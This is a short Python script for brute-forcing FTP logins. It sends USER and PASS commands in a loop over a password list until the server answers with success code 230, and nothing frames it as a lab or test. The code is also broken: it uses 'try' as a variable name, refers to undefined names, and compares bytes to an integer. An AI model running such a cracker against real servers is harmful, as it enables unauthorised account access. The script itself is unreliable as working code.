#! /usr/bin/python

import socket

def attempt(ip_a, port_n, username, password):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_a, port_n))
    data = s.recv(1024) #recieving vanner
    s.send("USER " + username + "\r\n") #sending username using USER command
    data = s.recv(1024) #recieving command asking for pass
    s.send("PASS " + password + " \r\n")  #sending password using PASS command
    data = s.recv(3) #recieving line saying whether pass is correct or not
    return data
    s.close() #closing socket

def crack(ip, port, user, passlist):
    word = open(dictionary)
    passwords = word.read().split('\n')
    for password in lines:
        try = attempt(ip, port, user, password)
        if try == 230:
            return password
        else:
            pass
